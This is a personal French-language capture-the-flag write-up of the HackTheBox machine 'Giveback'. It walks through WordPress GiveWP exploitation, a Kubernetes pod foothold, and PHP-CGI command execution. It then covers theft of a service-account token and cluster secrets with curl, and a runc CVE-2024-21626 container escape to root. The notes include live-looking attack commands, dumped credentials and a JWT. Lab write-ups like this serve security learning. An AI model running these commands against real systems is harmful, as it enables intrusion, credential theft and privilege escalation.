@@ -1,0 +1,551 @@
+┌──(kali㉿kali)-[~/Documents/giveback/CVE-2024-8353]
+└─$ nmap -p- -sV -A giveback.htb               
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 12:00 EST
+Nmap scan report for giveback.htb (10.10.11.94)
+Host is up (0.018s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE    SERVICE      VERSION
+22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
+|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
+80/tcp    open     http         nginx 1.28.0
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-generator: WordPress 6.8.1
+|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
+|_http-server-header: nginx/1.28.0
+6443/tcp  filtered sun-sr-https
+10250/tcp filtered unknown
+30686/tcp open     http         Golang net/http server
+|_http-title: Site doesn't have a title (application/json).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Load-Balancing-Endpoint-Weight: 1
+|     Date: Wed, 05 Nov 2025 17:01:39 GMT
+|     Content-Length: 127
+|     "service": {
+|     "namespace": "default",
+|     "name": "wp-nginx-service"
+|     "localEndpoints": 1,
+|     "serviceProxyHealthy": true
+|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Load-Balancing-Endpoint-Weight: 1
+|     Date: Wed, 05 Nov 2025 17:01:24 GMT
+|     Content-Length: 127
+|     "service": {
+|     "namespace": "default",
+|     "name": "wp-nginx-service"
+|     "localEndpoints": 1,
+|_    "serviceProxyHealthy": true
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port30686-TCP:V=7.95%I=7%D=11/5%Time=690B82D6%P=x86_64-pc-linux-gnu%r(G
+SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
+SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
+SF:x20Request")%r(GetRequest,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
+SF:x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Bal
+SF:ancing-Endpoint-Weight:\x201\r\nDate:\x20Wed,\x2005\x20Nov\x202025\x201
+SF:7:01:24\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\
+SF:n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-servic
+SF:e\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20t
+SF:rue\n}")%r(HTTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
+SF:application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balanc
+SF:ing-Endpoint-Weight:\x201\r\nDate:\x20Wed,\x2005\x20Nov\x202025\x2017:0
+SF:1:24\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t
+SF:\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"
+SF:\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true
+SF:\n}")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
+SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
+SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
+SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
+SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
+SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,132,"
+SF:HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/json\r\nX-Conten
+SF:t-Type-Options:\x20nosniff\r\nX-Load-Balancing-Endpoint-Weight:\x201\r\
+SF:nDate:\x20Wed,\x2005\x20Nov\x202025\x2017:01:39\x20GMT\r\nContent-Lengt
+SF:h:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t\t\"namespace\":\x20\"defaul
+SF:t\",\n\t\t\"name\":\x20\"wp-nginx-service\"\n\t},\n\t\"localEndpoints\"
+SF::\x201,\n\t\"serviceProxyHealthy\":\x20true\n}")%r(LPDString,67,"HTTP/1
+SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   17.18 ms 10.10.14.1
+2   17.40 ms giveback.htb (10.10.11.94)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.11 seconds
+
+
+
+nmap me donne deux ports classiques
+
+Quand je vais sur le port 80 je vois que des ressources tierse sont demandées via le domaine giveback.htb
+je rejoute donc le domaine au fichier hosts
+
+Je tombes sur un site wordpress, je lance wpscan:
+
+deux infos intéressantes
+
+[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://giveback.htb/, Match: 'WordPress 6.8.1'
+
+
+[+] give
+ | Location: http://giveback.htb/wp-content/plugins/give/
+ | Last Updated: 2025-10-29T20:17:00.000Z
+ | [!] The version is out of date, the latest version is 4.12.0
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By:
+ |  Urls In 404 Page (Passive Detection)
+ |  Meta Tag (Passive Detection)
+ |  Javascript Var (Passive Detection)
+ |
+ | Version: 3.14.0 (100% confidence)
+ | Found By: Query Parameter (Passive Detection)
+ |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
+ | Confirmed By:
+ |  Meta Tag (Passive Detection)
+ |   - http://giveback.htb/, Match: 'Give v3.14.0'
+ |  Javascript Var (Passive Detection)
+ |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'
+
+sur internet je tombes sur
+
+Vulnerability Details : CVE-2024-5932	
+Public exploit exists!
+GiveWP – Donation Plugin and Fundraising Platform <= 3.14.1 - Unauthenticated PHP Object Injection to Remote Code Execution
+j'utilise https://github.com/EQSTLab/CVE-2024-5932.git mais ça ne mène a rien 
+https://www.skshieldus.com/download/files/download.do?o_fname=Research%20Technique_PHP%20Object%20Injection%20Vulnerability%20in%20WordPress%20GiveWP%20(CVE-2024-5932).pdf&r_fname=20240927174114070.pdf
+je sais pas c'est compliqué SAH
+
+https://github.com/RandomRobbieBF/CVE-2025-22777
+ce cve a un reseau interne kubernetes dans son poc
+
+
+CVE-2024-8353 
+https://github.com/EQSTLab/CVE-2024-8353
+
+A FAIRE DEMAIN:
+tester les autres poc
+https://github.com/0xb0mb3r/CVE-2024-8353-PoC
+
+https://github.com/search?q=CVE-2024-5932&type=repositories
+(créé il y a 21h M D R )
+
+https://github.com/autom4il/CVE-2024-5932/blob/main/CVE-2024-5932.py
+en utilisant ça ça fonctionne
+
+en fait depuis 3 jours je bloque car souvent j'utilise curl pour tester si la commande est executée mais comme dans beaucoup de container curl n'est pas dispo
+
+avant de partir j'étais entrain de fix mon revshell.txt en le rendant lancable sans curl
+avec ça https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et
+
+une fois avec le foothold je me retrouves dans un pod kubernetes
+
+pleins d'infos interressantes dans les env
+
+WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
+WORDPRESS_PASSWORD=O8F7KR5zGi
+WORDPRESS_USERNAME=user
+WORDPRESS_DATABASE_USER=bn_wordpress
+WORDPRESS_DATABASE_NAME=bitnami_wordpress
+BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
+
+KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
+
+BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
+
+LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
+LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
+
+dans etc hosts
+10.42.1.232     beta-vino-wp-wordpress-6bc947f468-8p46q
+
+J'utilise un revhell ssh portable pour forward le site intranet 
+https://github.com/Fahrj/reverse-ssh
+ssh rev@localhost -p 8888 -L 5000:10.43.2.241:5000
+
+(img: sc/intra.jpg) en ouvrant l'intra qui m'est forward je tombes sur pleins de liens mais aucun lien ne fonctionne (405 ou 403)
+il y a ecrit sur beaucoup VPN required, j'etudies donc ça (peut être filtré par ip)
+
+MariaDB [bitnami_wordpress]> SELECT * FROM wp_users
+    -> ;
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+|  1 | user       | $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP. | user          | user@example.com | http://127.0.0.1 | 2024-09-21 22:18:28 |                     |           0 | babywyrm     |
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+1 row in set (0.016 sec)
+
+rien de bien interressant
+
+Les messages sur les legacy CGI scripts sur la page d'accueil de l'intra m'a fait pensé a un indice mais je n'ai pas l'experience pour comprendre, je vais donc sur chatgpt car il a une culture plus grande que moi et il me mets sur la piste du CVE-2012-1823, ça ne fonctionne pas mais ça me trigger un message d'erreur que j'arrive a isoler sur le paramètre ?auto_prepend_file=php://input (img: sc/error.jpg)
+Après de multiple tests je me rends compte que c'est directement le contenu du body sur une requete POST qui est executée en tant que commande (img: sc/exploit.jpg)
+J'ai donc accès a un nouveau pod, je vois qu'il n'y a ni bash ni nc, mais il y a curl, je télécharge donc le binaire de mon revssh sur le serv et je l'execute (avec ping j'ai vu qu'il pouvait joindre mon ip), ca n'est pas stable, je me contente donc d'un revshell sh lancé avec le php présent basique
+en me baladant je tombes sur ça
+/run/secrets/kubernetes.io/serviceaccount
+ls -la
+total 4
+drwxrwxrwt    3 root     root           140 Nov 14 17:27 .
+drwxr-xr-x    3 root     root          4096 Nov 14 16:38 ..
+drwxr-xr-x    2 root     root           100 Nov 14 17:27 ..2025_11_14_17_27_14.3971718581
+lrwxrwxrwx    1 root     root            32 Nov 14 17:27 ..data -> ..2025_11_14_17_27_14.3971718581
+lrwxrwxrwx    1 root     root            13 Nov 14 16:38 ca.crt -> ..data/ca.crt
+lrwxrwxrwx    1 root     root            16 Nov 14 16:38 namespace -> ..data/namespace
+lrwxrwxrwx    1 root     root            12 Nov 14 16:38 token -> ..data/token
+cat token
+eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk0Njc3MjM0LCJpYXQiOjE3NjMxNDEyMzQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNmRmOGRhYWMtNjcxYy00MmZkLTllMGMtOTIzODIzODE3Y2M2Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWI0ejhkIiwidWlkIjoiMDFlODRkZDMtY2ZiYS00ZTdkLThjZTEtYmFkMDM1ODE0ZjgzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MzE0NDg0MX0sIm5iZiI6MTc2MzE0MTIzNCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.a9g7aU2qwFosuKON5kU8VoLsuYSdJk322PoYB2QWHwfQExy0V5jG0Fsof4nj6kay85n5Z473698xBQt9WtoJ2zpuPoBHUaUUfJ-PbKyHCgSAqscA8n8Sc9EAKXK_26Hrn4Kb_TD-KjrRbnCleP-KaLqsh3LIr83refEogwBicj4bnu2315PMCjUdHEZOIVY3z_KGwbbpbSFJowtDIpQaWd5xrGs1SYHGrOOqrjz9_tOWlzAKucUI4A6cG0MNDWx4RRyx_6fr2IRkrqAr1DN-88wQNWG8xaTGG6su27M6LYWCQFw1RiFcN16e79orGUr8cZ5qrCDpRtqlpfGhqyTS5A
+cat namespace
+default
+
+qui d'appres claude ai est un JWT pour me connecter a une api de kubernetes
+
+je craft cette commande a partir des variables d'environnement pour l'Endpoint
+
+curl -k -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" https://10.43.0.1:443/api/v1/namespaces/default/secrets
+
+et je me retrouves avec un LOOOONNNG json contenant les secrets
+j'ai mal a la tête je vais aller faire la nouriture
+
+finalement dernier effort,
+je me rends compte que dans les secrets il y a:
+"name": "user-secret-babywyrm",
+"data": {
+"MASTERPASS": "YTJUZXpscmo3VU9IWFVpWkd0WkoxVG1uVWR0QmNk"
+},
+
+je me dis que c'est peut être la solution,
+je teste une première fois en ssh ça fonctionne pas, puis je me rapelle que c'est encodé en base64 ET BINGO !
+babywyrm:a2Tezlrj7UOHXUiZGtZJ1TmnUdtBcd (finalement le mdp change a chaque reset)
+en ssh, le user flag est dans le home.
+ça c'est fait, apparement la route vers le root est bien plus compliquée mais je verrais demain mtn que j'ai un checkpoint
+[TEASER]
+babywyrm@giveback:~$ sudo -l
+Matching Defaults entries for babywyrm on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20
+
+User babywyrm may run the following commands on localhost:
+    (ALL) NOPASSWD: !ALL
+    (ALL) /opt/debug
+
+hmmmm....
+[TEASER]
+
+en gros debug ne peut se lancer qu'en sudo et me demande un mdp
+
+babywyrm@giveback:/tmp$ ls -la /opt/debug
+-rwx------ 1 root root 5802 Nov 12 10:21 /opt/debug
+babywyrm@giveback:/tmp$ sudo /opt/debug 
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+Error: Incorrect administrative password
+
+
+══╣ Active Ports (netstat)                                                                                                                                                                                                                  
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                           
+tcp        0      0 127.0.0.1:10010         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:10249         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:10258         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:10259         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:10256         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:10257         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6444          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::30686                :::*                    LISTEN      -                   
+tcp6       0      0 :::6443                 :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::10250                :::*                    LISTEN      -                   
+
+
+-rwxr-sr-x 1 root plocate 307K Feb 17  2022 /usr/bin/plocate (Unknown SGID binary)
+hmm plocate, un indice pour dire qu'il y a un fichier a trouver ?
+après avoir eu un indice il fallait utiliser le mdp de la base de données mariadb CA N'A AUCUN SENS j'aurais jamais trouvé tout seul, mais bon il faudra que je rajoutes a mes notes "noter tout les mdp disponibles"
+WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
+babywyrm@giveback:/tmp$ sudo /opt/debug -v
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: -v
+runc version 1.1.11
+commit: v1.1.11-0-g4bccb38c
+spec: 1.0.2-dev
+go: go1.20.12
+libseccomp: 2.5.4
+
+babywyrm@giveback:/tmp$ sudo /opt/debug -v
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: -v
+runc version 1.1.11
+commit: v1.1.11-0-g4bccb38c
+spec: 1.0.2-dev
+go: go1.20.12
+libseccomp: 2.5.4
+babywyrm@giveback:/tmp$ sudo /opt/debug --help
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: --help
+Restricted runc Debug Wrapper
+
+Usage:
+  /opt/debug [flags] spec
+  /opt/debug [flags] run <id>
+  /opt/debug version | --version | -v
+
+Flags:
+  --log <file>
+  --root <path>
+  --debug
+
+en testant un privesc de hackthebox je tombes sur cette erreur
+
+babywyrm@giveback:/tmp/neirda2$ cat config.json 
+{
+  "ociVersion": "1.0.2-dev",
+  "process": {
+    "terminal": true,
+    "user": {
+      "uid": 0,
+      "gid": 0
+    },
+    "args": [
+      "/bin/sh"
+    ],
+    "env": [
+      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+      "TERM=xterm"
+    ],
+    "cwd": "/",
+    "capabilities": {
+      "bounding": [
+        "CAP_CHOWN",
+        "CAP_DAC_OVERRIDE",
+        "CAP_FSETID",
+        "CAP_FOWNER",
+        "CAP_MKNOD",
+        "CAP_NET_RAW"
+      ],
+      "effective": [
+        "CAP_CHOWN",
+        "CAP_DAC_OVERRIDE",
+        "CAP_FSETID",
+        "CAP_FOWNER",
+        "CAP_MKNOD",
+        "CAP_NET_RAW"
+      ],
+      "inheritable": [],
+      "permitted": [
+        "CAP_CHOWN",
+        "CAP_DAC_OVERRIDE",
+        "CAP_FSETID",
+        "CAP_FOWNER",
+        "CAP_MKNOD",
+        "CAP_NET_RAW"
+      ],
+      "ambient": []
+    },
+    "rlimits": [
+      {
+        "type": "RLIMIT_NOFILE",
+        "hard": 1024,
+        "soft": 1024
+      }
+    ],
+    "noNewPrivileges": true
+  },
+  "root": {
+    "path": "rootfs",
+    "readonly": true
+  },
+  "hostname": "runc",
+  "mounts": [
+    {
+      "destination": "/proc",
+      "type": "proc",
+      "source": "proc"
+    },
+    {
+      "destination": "/dev",
+      "type": "tmpfs",
+      "source": "tmpfs",
+      "options": [
+        "nosuid",
+        "strictatime",
+        "mode=755",
+        "size=65536k"
+      ]
+    },
+    {
+      "destination": "/dev/pts",
+      "type": "devpts",
+      "source": "devpts",
+      "options": [
+        "nosuid",
+        "noexec",
+        "newinstance",
+        "ptmxmode=0666",
+        "mode=0620",
+        "gid=5"
+      ]
+    },
+    {
+      "destination": "/dev/shm",
+      "type": "tmpfs",
+      "source": "shm",
+      "options": [
+        "nosuid",
+        "noexec",
+        "nodev",
+        "mode=1777",
+        "size=65536k"
+      ]
+    },
+    {
+      "destination": "/dev/mqueue",
+      "type": "mqueue",
+      "source": "mqueue",
+      "options": [
+        "nosuid",
+        "noexec",
+        "nodev"
+      ]
+    },
+    {
+      "destination": "/sys",
+      "type": "sysfs",
+      "source": "sysfs",
+      "options": [
+        "nosuid",
+        "noexec",
+        "nodev",
+        "ro"
+      ]
+    },
+    {
+      "destination": "/sys/fs/cgroup",
+      "type": "cgroup",
+      "source": "cgroup",
+      "options": [
+        "nosuid",
+        "noexec",
+        "nodev",
+        "relatime",
+        "ro"
+      ]
+    },
+    {
+      "type": "bind",
+      "source": "/",
+      "destination": "/",
+      "options": [
+          "rbind",
+          "rw",
+          "rprivate"
+      ]
+    }
+  ],
+  "linux": {
+    "resources": {},
+    "namespaces": [
+      {
+        "type": "pid"
+      },
+      {
+        "type": "ipc"
+      },
+      {
+        "type": "uts"
+      },
+      {
+        "type": "mount"
+      },
+      {
+        "type": "network"
+      }
+    ],
+    "maskedPaths": [
+      "/proc/acpi",
+      "/proc/asound",
+      "/proc/kcore",
+      "/proc/keys",
+      "/proc/latency_stats",
+      "/proc/timer_list",
+      "/proc/timer_stats",
+      "/proc/sched_debug",
+      "/sys/firmware",
+      "/proc/scsi"
+    ],
+    "readonlyPaths": [],
+    "maskPaths": [],
+    "seccomp": null
+  }
+}
+babywyrm@giveback:/tmp/neirda2$ echo "sW5sp4spa3u7RLyetrekE4oS" | sudo /opt/debug --debug --log caca.txt run 2
+[sudo] password for babywyrm: 
+[*] Validating sudo privileges...
+[*] Sudo validation successful
+Please enter the administrative password: 
+
+[*] Administrative password verified
+[*] Processing command: run
+Error: Host root filesystem mount detected - not permitted
+babywyrm@giveback:/tmp/neirda2$ 
+
+echo "sW5sp4spa3u7RLyetrekE4oS" | sudo /opt/debug --debug --log caca.txt run
+
+en regardant la version 1.1.11 et que la version actuelle est 1.4.0, je vais rechercher si ça me mets sur la piste d'un cve, et sur le github je tombes sur un cve fix dans la version suivante (img: sc/cve.jpg) CVE-2024-21626
+je trouves un POC https://github.com/NitroCao/CVE-2024-21626
+et en adaptant la methode runc 
+~/container/runc/runc --version
+docker run --name helper-ctr alpine
+docker export helper-ctr --output alpine.tar
+mkdir rootfs
+tar xf alpine.tar -C rootfs
+~/container/runc/runc spec
+sed -ri 's#(\s*"cwd": )"(/)"#\1 "/proc/self/fd/7"#g' config.json
+grep cwd config.json
+sudo ~/container/runc/runc --log ./log.json run demo
+
+j'arrive finalement a avoir accès au rootflag (img: sc/flag.jpg)
+Mais bon pour avoir une vrai victoire il me faudrait un shell root
+J'utilise la meme strat pour creer un bash suid dans le /tmp (img: sc/bashcp.jpg) (img: sc/bashcp2.jpg)
+et ça fonctionne.
+FINIS !
+
+Bilan:
+Franchement même pour une box moyenne c'était vachement long et complexe, j'ai eu un premier blocage au premier CVE sur l'extension wordpress principalement parcequ'il n'y avait pas curl d'installé et ça niquait mon protocole (mauvais protocole) pour detecter un RCE, j'ai donc modifié tout ça et je ferais plus gaffe a l'avenir. Pour la deuxieme étape qui consistait a utiliser un CGI mal configuré de l'intranet pour pour executer une commande j'ai un peu l'impression de l'avoir découvert par chance mais j'ai réussis rapidement à m'en sortir (ça m'a permis aussi de découvrir de super tools comme reverse-ssh pour forward les services internes et avoir un shell plus stable), la 3e étape qui consistait a trouver le jwt et de l'utiliser pour recuperer le mdp de l'utilisateur etait vraiment directe et simple. Un truc qui m'a soulé était que le mdp se resetait a chaque fois donc je ne pouvais pas utiliser cela en tant que checkpoint pour recommencer le lendemain aussi facilement que sur d'autres box (mais de ce que j'ai compris c'était pour eviter les tricheurs). La 4e étape qui consistait a trouver le mdp de /opt/debug était franchement frustrante et inutile (comme de la difficultée artificielle rajoutée), mais surement utile dans un contexte réel de garder une bonne discipline pour noter tout les mdp et tenter les password reuse (je trouves ça quand meme un peu abusé). La 5e etape (l'exploitation de runc) j'ai perdu un jour a tester les méthodes de runc de hacktricks pour mount un dossier root dans le systeme, finalement je me suis vite rapelé que la version était dépassée et une fois le CVE et le poc trouvé c'était assez simple (j'aurais du passer plus de temps a comprendre le poc mais il faut que je passes a d'autres box). J'imagine que j'aurais pu economiser du temps en me rapellant la "philosophie" des boxs htb (ou beaucoup de choses sont basées sur des cve) mais au fond de moi j'avais envie que ce soit un truc plus "manuel" comme la proposition de mount sur hacktricks (et je ne comprenais pas pourquoi ça ne fonctionnerais pas, et je comprends tjrs pas, mtn j'ai envie de retest avec mes nouvelles connaissances de runc mais j'ai tout delete donc flemme mdrrr). Sinon en vrai j'ai vraiment passé du bon temps dessus, moins horrible que ce que je pensais.
